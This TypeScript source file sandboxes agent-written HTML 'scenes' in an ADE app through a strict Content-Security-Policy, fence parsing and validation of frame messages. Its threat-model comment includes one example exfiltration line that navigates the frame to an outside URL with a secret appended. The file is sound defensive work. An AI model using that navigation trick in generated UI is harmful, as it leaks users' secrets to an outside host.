/**
 * Scenes — agent-authored generated UI.
 *
 * A scene is a ```scene fence containing ordinary HTML, CSS and JS. Unlike a
 * mosaic card (data, validated, rendered by ADE's own components) a scene is
 * *code the agent wrote*, so it never runs in ADE's renderer. It runs inside a
 * frame that has its own opaque origin, its own Content-Security-Policy, and
 * `sandbox="allow-scripts"` WITHOUT `allow-same-origin` — that pair is the one
 * combination which would hand the frame back its own origin, and nothing here
 * may ever set both.
 *
 * The policy below is the whole security story, so read it before changing it:
 *
 *   default-src 'none'   nothing loads unless a later directive allows it
 *   connect-src 'none'   no fetch, no XHR, no WebSocket, no beacon
 *   script-src 'unsafe-inline'   inline script only; no remote code, no eval
 *   img-src data: blob:  pixels the host handed over, never a remote URL
 *
 * A scene therefore cannot FETCH anything out: no request it can originate is
 * allowed to leave. It is not a total seal, and the difference matters —
 * navigating the frame (`location = "https://elsewhere/?" + secret`) is a
 * navigation, not a fetch, and nothing in this policy speaks to it. Two doors
 * close that one, both outside this file: the renderer's own `frame-src`
 * bounds where a nested context may go, and main refuses a subframe navigation
 * outside that same allowlist (`will-frame-navigate` in `main.ts`).
 *
 * Two further risks remain and are handled elsewhere. It can draw something
 * misleading, so the host labels every scene on hover and a scene can never
 * approve, confirm or reach anything: its only ways out are the messages
 * {@link parseSceneHostMessage} accepts. And it can burn CPU and GPU. The bounds
 * on that are the source-size cap below, the clamped frame height, the host
 * running a frame only while its scene is on screen (a still stands in
 * otherwise), and the SDK idling a settled scene nobody is touching: endless
 * animations pause and `requestAnimationFrame` drops to a few frames a second
 * until the pointer or focus comes back. There is no CPU watchdog for a busy
 * script loop.
 *
 * Division of labour with mosaic: a scene SHOWS, a mosaic ASKS. Approvals and
 * destructive confirmations stay in mosaic and in ADE's native surfaces — a
 * scene drawing its own "Approve" button would be a scene approving itself.
 */

export const SCENE_FENCE_LANGUAGE = "scene";

/**
 * The identity of ONE scene inside a message.
 *
 * A row identity is not enough on its own: a message may hold two scene
 * fences, and both of them being handed the row's identity meant they shared a
 * still — whichever settled last overwrote the other, and a reopened chat
 * showed the same picture twice. The source hash is what separates them, the
 * same way mosaic cards separate two answerable cards in one message.
 *
 * Stored with the still in main, so it must be derived identically on every
 * mount: a pure function of the row identity and the fence body, and nothing
 * else. Pass {@link sceneRowIdentity}, not a transcript render key — see it for
 * why the render key is not stable enough to be a still's name on disk.
 */
export function sceneScopeKeyFor(rowIdentity: string, source: string): string {
  return `${rowIdentity}:${djb2Hash(source)}`;
}

/**
 * What identifies the ROW a scene was drawn in, across every rebuild of the
 * transcript.
 *
 * This is a FILE NAME on disk, so its format is frozen: stills already filed
 * under `message:` / `item:` names must keep matching. Render keys used to
 * embed the event's index in the loaded window (so a prepended page or a front
 * trim renamed every row, and a scene re-ran and re-filed a second still on
 * every reopen); they are now built from the same identity facts
 * (`allocateTranscriptEventRowKey`), but they carry a session prefix and an
 * event-type tag this name never had.
 *
 * `messageId` is the provider's own name for the message. `turnId` + `itemId`
 * is the same fact assembled from two fields, for providers that name items
 * but not messages. The row key is the last resort — for a text event carrying
 * none of the three it is timestamp-based, which survives paging but not a
 * provider that rewrites timestamps.
 */
export function sceneRowIdentity(
  event: { messageId?: string | null; turnId?: string | null; itemId?: string | null },
  rowKey: string,
): string {
  const messageId = event.messageId?.trim();
  if (messageId) return `message:${messageId}`;
  const turnId = event.turnId?.trim();
  const itemId = event.itemId?.trim();
  if (turnId && itemId) return `item:${turnId}:${itemId}`;
  return rowKey;
}

/** djb2, base 36. Short, stable, and not a security boundary. */
function djb2Hash(input: string): string {
  let hash = 5381;
  for (let index = 0; index < input.length; index += 1) {
    hash = ((hash << 5) + hash + input.charCodeAt(index)) | 0;
  }
  return (hash >>> 0).toString(36);
}

export const SCENE_LIMITS = {
  /** Source bytes. Past this a scene is a document, not a view. */
  maxSourceBytes: 96_000,
  /**
   * Bytes of ASSEMBLED document the main process will hold for a frame.
   *
   * The renderer checks `maxSourceBytes` before it ever calls `scene.prepare`,
   * but the document store is bounded by document COUNT, so a renderer that
   * skipped that check could pin 64 unbounded strings in main. This is the
   * server-side bound: the fence source plus the fixed template and the two
   * inlined app fonts (~150 KB as data URLs; see `sceneFonts.ts`), with room
   * for both rather than a second magic number at the IPC edge.
   */
  maxDocumentBytes: 400_000,
  maxTitleLength: 120,
  /** A scene that never reports ready is treated as up after this, so its still is not held over it forever. */
  readyTimeoutMs: 8_000,
} as const;

/**
 * How long the DOM has to hold still, with no animation running, before a
 * scene is called settled.
 *
 * Long enough to bridge the gap between two steps of a staged reveal — a scene
 * that fades a header in and then, a beat later, counts a number up is one
 * animation as far as the author is concerned — and short enough that the
 * still is taken while the view still means what it drew.
 */
export const SCENE_SETTLE_QUIET_MS = 600;

/**
 * The longest a scene may keep the settle watcher waiting after `ready`.
 *
 * There has to be a cap: a scene with a looping animation (a pulsing dot, a
 * marquee) is never quiet and never will be, and without a deadline it would
 * simply never produce a still. At the cap the host takes the picture anyway —
 * a frame of a loop is a truthful picture of a view that loops.
 */
export const SCENE_SETTLE_MAX_MS = 4_000;

export const SCENE_CONTENT_SECURITY_POLICY = [
  "default-src 'none'",
  "script-src 'unsafe-inline'",
  "style-src 'unsafe-inline'",
  "img-src data: blob:",
  "media-src data: blob:",
  "font-src data:",
  "connect-src 'none'",
  "form-action 'none'",
  "base-uri 'none'",
  "frame-src 'none'",
  "object-src 'none'",
].join("; ");

/**
 * Live ADE data a scene may ask for on its marker line,
 * `<!-- @scene title="…" data="lanes,prs" -->`. The host sends each one as a
 * read-only snapshot and again when it changes; see `sceneData.ts`.
 */
export const SCENE_DATA_SOURCES = ["lanes", "sessions", "prs"] as const;
export type SceneDataSource = (typeof SCENE_DATA_SOURCES)[number];

export type ParsedScene = {
  title: string | null;
  /** The agent's markup, unwrapped from any document tags it supplied. */
  html: string;
  /** The live sources the scene asked for, in a fixed order; empty for none. */
  data: SceneDataSource[];
};

function readSceneDataSources(raw: string | undefined): SceneDataSource[] {
  if (!raw) return [];
  const asked = new Set(raw.toLowerCase().split(/[\s,]+/).filter(Boolean));
  return SCENE_DATA_SOURCES.filter((source) => asked.has(source));
}

export type SceneParseFailure = {
  reason: "empty" | "too-large";
  detail: string;
};

const MARKER = /^\s*<!--\s*@scene\b([^>]*?)-->\s*$/i;
const ATTR = /(\w+)\s*=\s*"([^"]*)"/g;

/** Pull `title="…"` (and any future keys) off the `<!-- @scene … -->` line. */
function readMarkerAttributes(rest: string): Record<string, string> {
  const out: Record<string, string> = {};
  let match: RegExpExecArray | null;
  ATTR.lastIndex = 0;
  while ((match = ATTR.exec(rest))) out[match[1].toLowerCase()] = match[2];
  return out;
}

/**
 * The document furniture a scene never gets to keep.
 *
 * `<head>`/`<body>` lose the tag but keep their contents (styles, fonts, the
 * markup itself) so the fragment concatenates cleanly into the host template.
 * Dropping `<base>` matters even though `default-src 'none'` already blocks
 * every fetch: it keeps relative-URL behaviour predictable if the policy is
 * ever loosened. And a scene cannot relax its own policy, so a CSP meta the
 * model wrote goes too.
 */
const DOCUMENT_WRAPPER = new RegExp([
  "<!doctype[^>]*>",
  "</?(?:html|head|body)(?:\\s[^>]*)?>",
  "<base(?:\\s[^>]*)?>",
  "<meta[^>]+http-equiv\\s*=\\s*[\"']?content-security-policy[\"']?[^>]*>",
].join("|"), "gi");

/**
 * Regions whose text is DATA, not markup, and must survive byte for byte.
 *
 * One alternation rather than three passes so the earliest opener wins: a
 * `<script>` written inside a comment is part of the comment, and a `<!--`
 * inside a script is part of the script.
 */
const VERBATIM_REGION = /<script\b[\s\S]*?<\/script\s*>|<style\b[\s\S]*?<\/style\s*>|<!--[\s\S]*?-->/gi;

/**
 * Models emit anything from a bare `<div>` to a full document. Normalize both
 * to a fragment so the host template owns <head> and the policy that lives in
 * it.
 *
 * The strip runs only OUTSIDE script, style and comment bodies. A blanket
 * `replace` over the whole source deleted the literal text `<body>` from inside
 * a JS string — a scene that rendered a snippet of HTML as its own content came
 * out silently corrupted, with no parse error to point at. Scanning for the
 * verbatim regions first costs one extra pass and makes the strip mean what its
 * name says: document furniture, not anything that happens to look like it.
 */
function unwrapDocument(source: string): string {
  let out = "";
  let cursor = 0;
  VERBATIM_REGION.lastIndex = 0;
  let region: RegExpExecArray | null;
  while ((region = VERBATIM_REGION.exec(source))) {
    out += source.slice(cursor, region.index).replace(DOCUMENT_WRAPPER, "");
    out += region[0];
    cursor = region.index + region[0].length;
  }
  out += source.slice(cursor).replace(DOCUMENT_WRAPPER, "");
  return out.trim();
}

/**
 * True while the last ```scene fence in a markdown body is still open.
 *
 * The markdown parser renders an unterminated fence as a finished code block on
 * every streamed tick, so without this the host prepares a new document and
 * reloads the frame several times a second — each reload throwing away whatever
 * the half-written scene had drawn. Fence state is tracked for every language,
 * not just `scene`: a ``` inside an open ```ts block closes that block and does
 * not open a scene.
 */
export function hasOpenSceneFence(markdown: string): boolean {
  return openFenceLanguage(markdown) === SCENE_FENCE_LANGUAGE;
}

/**
 * The language of the fence a still-arriving document leaves open, or null
 * when every fence is closed. A block that renders its fence as something
 * other than code (a scene, a mermaid diagram) holds while its own language
 * is open, so it never draws half a source.
 */
export function openFenceLanguage(markdown: string): string | null {
  return openFence(markdown)?.language ?? null;
}

/** The fence a still-arriving document leaves open: its language and the body so far. */
export function openFence(markdown: string): { language: string; body: string } | null {
  const { open } = scanFences(markdown);
  return open ? { language: open.language, body: open.body } : null;
}

/** One fence, as the scanner below located it. */
type FenceSpan = {
  language: string;
  /** Line indexes, half-open: the fence's own opening and closing lines included. */
  startLine: number;
  endLineExclusive: number;
  body: string;
};

/**
 * Every top-level fence in a markdown document, in order.
 *
 * The same line scanner `hasOpenSceneFence` uses, and deliberately so: the two
 * have to agree on \`\`\` versus ~~~, on up to three spaces of indentation, and on
 * the rule that a fence inside an open block closes that block rather than
 * opening a nested one. A second, looser regex somewhere else is how "the
 * streaming guard says a scene is open" and "the splitter found no scene" end
 * up both being true.
 */
function readFenceSpans(markdown: string): FenceSpan[] {
  return scanFences(markdown).spans;
}

/**
 * The CommonMark fence rule both readers share: a fence opens on three or more
 * backticks or tildes (indented at most three spaces) and closes only on a
 * bare run of the SAME character at least as long. So a ~~~ line inside a ```
 * block, or ``` inside a ```` block, is content, as the markdown renderer
 * reads it.
 */
function scanFences(markdown: string): { spans: FenceSpan[]; open: FenceSpan | null } {
  const lines = String(markdown ?? "").split("\n");
  const spans: FenceSpan[] = [];
  let opener: { marker: string; language: string; at: number } | null = null;
  for (let i = 0; i < lines.length; i += 1) {
    const line = lines[i]!;
    if (opener === null) {
      const fence = /^ {0,3}(`{3,}|~{3,})(.*)$/.exec(line);
      const info = fence?.[2] ?? "";
      // A backtick fence's info string may not contain a backtick (then the
      // line is inline code, not a fence).
      if (fence && !(fence[1]![0] === "`" && info.includes("`"))) {
        opener = { marker: fence[1]!, language: (info.trim().split(/\s+/)[0] ?? "").toLowerCase(), at: i };
      }
      continue;
    }
    const close = /^ {0,3}(`{3,}|~{3,})\s*$/.exec(line);
    if (!close || close[1]![0] !== opener.marker[0] || close[1]!.length < opener.marker.length) continue;
    spans.push({ language: opener.language, startLine: opener.at, endLineExclusive: i + 1, body: lines.slice(opener.at + 1, i).join("\n") });
    opener = null;
  }
  const open = opener
    ? { language: opener.language, startLine: opener.at, endLineExclusive: lines.length, body: lines.slice(opener.at + 1).join("\n") }
    : null;
  return { spans, open };
}

/**
 * Split a message into what should be read aloud and the one scene it drew.
 *
 * The fence has to come OUT of the prose or a voice model reads HTML aloud —
 * and so does every OTHER scene fence, because the prompt allows exactly one
 * and a second one left behind is read out in full. Only the first VALID fence
 * becomes the scene; a malformed one is left in the prose rather than silently
 * dropped, so the failure is audible instead of invisible.
 */
export function extractSceneFence(markdown: string): {
  spoken: string;
  sceneSource?: string;
} {
  const text = String(markdown ?? "");
  const spans = readFenceSpans(text).filter((span) => span.language === SCENE_FENCE_LANGUAGE);
  if (!spans.length) return { spoken: text.trim() };

  const chosen = spans.find((span) => !isSceneParseFailure(parseSceneFence(span.body))) ?? null;
  // Every scene fence leaves the prose, valid or not, EXCEPT a malformed one
  // that is the only candidate — that one stays, so the user hears that
  // something was meant to be here.
  const removed = chosen ? spans : spans.slice(1);
  if (!removed.length) return { spoken: text.trim() };

  const lines = text.split("\n");
  const dropped = new Set<number>();
  for (const span of removed) {
    for (let i = span.startLine; i < span.endLineExclusive; i += 1) dropped.add(i);
  }
  const spoken = lines.filter((_line, index) => !dropped.has(index)).join("\n").trim();
  return chosen ? { spoken, sceneSource: chosen.body } : { spoken };
}

/** `Buffer` does not exist in the renderer; this file is shared by both sides. */
function utf8ByteLength(value: string): number {
  return new TextEncoder().encode(value).length;
}

export function parseSceneFence(source: string): ParsedScene | SceneParseFailure {
  const raw = String(source ?? "");
  if (utf8ByteLength(raw) > SCENE_LIMITS.maxSourceBytes) {
    return { reason: "too-large", detail: `Scene exceeds ${SCENE_LIMITS.maxSourceBytes} bytes.` };
  }

  const lines = raw.split("\n");
  let title: string | null = null;
  let data: SceneDataSource[] = [];
  let bodyStart = 0;
  for (let i = 0; i < lines.length; i += 1) {
    if (!lines[i].trim().length) {
      bodyStart = i + 1;
      continue;
    }
    const marker = MARKER.exec(lines[i]);
    if (marker) {
      const attrs = readMarkerAttributes(marker[1] ?? "");
      const parsed = (attrs.title ?? "").trim();
      if (parsed.length) title = parsed.slice(0, SCENE_LIMITS.maxTitleLength);
      data = readSceneDataSources(attrs.data);
      bodyStart = i + 1;
    }
    break;
  }

  const html = unwrapDocument(lines.slice(bodyStart).join("\n"));
  if (!html.length) return { reason: "empty", detail: "Scene has no markup." };
  return { title, html, data };
}

export function isSceneParseFailure(value: ParsedScene | SceneParseFailure): value is SceneParseFailure {
  return "reason" in value;
}

/**
 * One line standing in for a scene on a surface that cannot run one.
 *
 * The TUI is the caller that matters: a scene is up to 96 KB of HTML and CSS,
 * and printing it into a terminal transcript buries the answer the user asked
 * for under a wall of markup. The mosaic fence already collapses this way; this
 * is the same contract for the other fence ADE renders natively.
 */
export function summarizeSceneFence(source: string): string {
  const parsed = parseSceneFence(source);
  const title = isSceneParseFailure(parsed) ? null : parsed.title;
  return `[scene: ${title ?? "generated view"}]`;
}

/**
 * Tokens forwarded into the frame as CSS custom properties. The frame cannot
 * read ADE's stylesheet — different origin — so a scene that wants to look like
 * ADE has to be handed the palette. Resolved values only; `var(--color-fg)`
 * would mean nothing on the other side.
 */
export type SceneTheme = {
  bg: string;
  /**
   * A raised fill for cards. Must be a value that resolves on its own inside
   * the frame: a `var(--color-fg)` reference means nothing there, and an
   * invalid custom property turned every `var(--surface)` transparent.
   */
  surface: string;
  border: string;
  fg: string;
  fgMuted: string;
  accent: string;
  success: string;
  warning: string;
  danger: string;
  fontSans: string;
  fontMono: string;
  /** `color-scheme` for form controls and scrollbars. */
  scheme: "dark" | "light";
  /** The transcript's prose size in px, so scene text sits at the reply's size. */
  fontSize: number;
};

export const SCENE_FALLBACK_THEME: SceneTheme = {
  bg: "#0f0f11",
  surface: "rgba(255,255,255,0.04)",
  border: "rgba(255,255,255,0.10)",
  fg: "#F0F0F2",
  fgMuted: "rgba(240,240,242,0.58)",
  accent: "#A78BFA",
  success: "#4ade80",
  warning: "#fbbf24",
  danger: "#f87171",
  fontSans: "Geist, system-ui, -apple-system, BlinkMacSystemFont, \"Segoe UI\", sans-serif",
  fontMono: "\"JetBrains Mono\", ui-monospace, SFMono-Regular, Menlo, monospace",
  scheme: "dark",
  fontSize: 13,
};

/** The CSS custom properties a theme becomes inside the frame. */
export function sceneThemeVariables(theme: SceneTheme): Array<[string, string]> {
  return [
    ["--bg", theme.bg],
    ["--surface", theme.surface],
    ["--border", theme.border],
    ["--fg", theme.fg],
    ["--fg-muted", theme.fgMuted],
    ["--accent", theme.accent],
    ["--success", theme.success],
    ["--warning", theme.warning],
    ["--danger", theme.danger],
    ["--font-sans", theme.fontSans],
    ["--font-mono", theme.fontMono],
    ["--font-size", `${theme.fontSize}px`],
  ];
}

/** One string per theme: equal exactly when two themes would draw a scene identically. */
export function sceneThemeSignature(theme: SceneTheme): string {
  return JSON.stringify([sceneThemeVariables(theme), theme.scheme]);
}

/**
 * A message from the host into a scene frame. The frame acts on these only when
 * they come from its parent window.
 *
 * - `theme`: ADE's theme changed; the SDK re-applies the variables and
 *   `color-scheme`, updates `ade.theme`, and calls `ade.on("theme")` listeners.
 * - `data`: new live data; the SDK sets `ade.data` and calls `ade.on("data")`.
 */
export type SceneFrameInbound =
  | { type: "theme"; payload: SceneThemeMessagePayload }
  /** A snapshot of the live sources the scene asked for (`sceneData.ts`). */
  | { type: "data"; payload: unknown };

/**
 * A theme as the frame applies it: the resolved theme for `ade.theme`, and the
 * CSS variables it becomes, built by {@link sceneThemeVariables} so a live
 * switch sets exactly what the first paint set.
 */
export type SceneThemeMessagePayload = { theme: SceneTheme; variables: Array<[string, string]> };

export function sceneThemeMessage(theme: SceneTheme): SceneFrameInbound {
  return { type: "theme", payload: { theme, variables: sceneThemeVariables(theme) } };
}

/** The envelope the in-frame SDK listens for. */
export function sceneFrameMessage(message: SceneFrameInbound): { __adeSceneHost: 1 } & SceneFrameInbound {
  return { __adeSceneHost: 1, ...message };
}


/**
 * A scene's still, once the bytes are on disk.
 *
 * The picture, not the code: a still is what a scene leaves behind so that
 * scrollback and a reopened chat both show SOMETHING
 * rather than an empty gap where a view used to be.
 *
 * `uri` is project-relative (`.ade/artifacts/computer-use/…png`) because that
 * is what `ade-artifact://project/` resolves and what survives a project moving
 * on disk. `artifactId` is the proof-drawer record when one was created; it can
 * be null — an unfiled still is still a picture, and losing the drawer row is a
 * smaller loss than losing the image.
 */
export type SceneStillRecord = {
  uri: string;
  artifactId: string | null;
  title: string;
};

/**
 * Messages the frame is allowed to send. Anything else is dropped.
 *
 * `nonce` is the sending DOCUMENT's id — see {@link SceneDocumentArgs.nonce}.
 * Optional in the type because the parser cannot require what an older prepared
 * document, still in main's store, was built without; it is the HOST that
 * decides an unstamped message is not one of its own.
 */
export type SceneHostMessage = { nonce?: string } & (
  | { type: "ready"; payload: { height?: number } }
  | { type: "resize"; payload: { height?: number } }
  /**
   * The scene has stopped moving: no animation is running and the DOM has been
   * quiet for {@link SCENE_SETTLE_QUIET_MS}, or {@link SCENE_SETTLE_MAX_MS}
   * elapsed since `ready`. It is the host's cue to take the still — the moment
   * the view is finished but before the turn ends and the frame comes down.
   */
  | { type: "settled"; payload: { height?: number } }
  | { type: "emit"; payload: { name: string; payload?: unknown } }
  /** `policy`: a request the scene policy blocked (a remote font, an image), not a thrown error. */
  | { type: "error"; payload: { message: string; policy?: true } }
  /**
   * Open a link: an `ade://` deeplink in ADE, or an http(s) page in ADE's
   * browser. Sent by `ade.open(url)` and by any `<a href>` click in the scene.
   * The host acts on it only right after the user clicked inside the frame.
   */
  | { type: "open"; payload: { url: string } }
);

const ALLOWED_MESSAGE_TYPES = new Set(["ready", "resize", "settled", "emit", "error", "open"]);

/**
 * Validate an inbound frame message. The frame is untrusted, so shape-check
 * every field rather than spreading whatever arrived into host state.
 */
export function parseSceneHostMessage(value: unknown): SceneHostMessage | null {
  if (!value || typeof value !== "object") return null;
  const record = value as Record<string, unknown>;
  if (record.__adeScene !== 1) return null;
  const type = typeof record.type === "string" ? record.type : "";
  if (!ALLOWED_MESSAGE_TYPES.has(type)) return null;
  const payload = (record.payload && typeof record.payload === "object" ? record.payload : {}) as Record<string, unknown>;
  // Bounded like every other string off the wire, and absent rather than empty
  // when it is not a usable one — an empty nonce must never match a real one.
  const rawNonce = typeof record.nonce === "string" ? record.nonce.slice(0, 120) : "";
  const nonce = rawNonce.length ? { nonce: rawNonce } : {};

  if (type === "emit") {
    const name = typeof payload.name === "string" ? payload.name.slice(0, 120) : "";
    if (!name.length) return null;
    return { ...nonce, type: "emit", payload: { name, payload: payload.payload } };
  }
  if (type === "error") {
    const message = typeof payload.message === "string" ? payload.message.slice(0, 500) : "scene error";
    return { ...nonce, type: "error", payload: { message, ...(payload.policy === true ? { policy: true as const } : {}) } };
  }
  if (type === "open") {
    const url = typeof payload.url === "string" ? payload.url.trim() : "";
    if (!url.length || url.length > 2048) return null;
    return { ...nonce, type: "open", payload: { url } };
  }
  const height = typeof payload.height === "number" && Number.isFinite(payload.height)
    ? Math.max(0, Math.min(4000, Math.round(payload.height)))
    : undefined;
  if (type === "ready") return { ...nonce, type: "ready", payload: { height } };
  if (type === "settled") return { ...nonce, type: "settled", payload: { height } };
  return { ...nonce, type: "resize", payload: { height } };
}
